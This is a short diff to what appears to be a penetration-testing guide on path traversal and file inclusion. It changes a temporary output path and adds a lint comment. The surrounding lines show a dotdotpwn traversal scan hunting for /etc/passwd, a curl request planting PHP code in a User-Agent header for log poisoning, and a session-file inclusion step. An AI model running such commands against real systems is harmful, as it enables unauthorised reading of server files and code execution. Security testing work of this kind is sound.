@@ -166,7 +166,7 @@ ffuf -u "https://target.example.com/download?file=FUZZ" \
 dotdotpwn -m http-url \
   -u "https://target.example.com/download?file=TRAVERSAL" \
   -k "root:" \
-  -o /tmp/dotdotpwn-results.txt \
+  -o ${TMPDIR:-/tmp}/dotdotpwn-results.txt \
   -d 8 -t 200
 
 # Burp Intruder approach:
@@ -207,7 +207,7 @@ curl -s -A "<?php phpinfo(); ?>" \
 
 # Session file inclusion
 # Write PHP code into session via another parameter
-# Then include: /tmp/sess_<PHPSESSID>
+# Then include: /tmp/sess_<PHPSESSID>  # no-tmp: ok — target host's session.save_path
 ```
 
 ### Step 6: Read High-Value Files
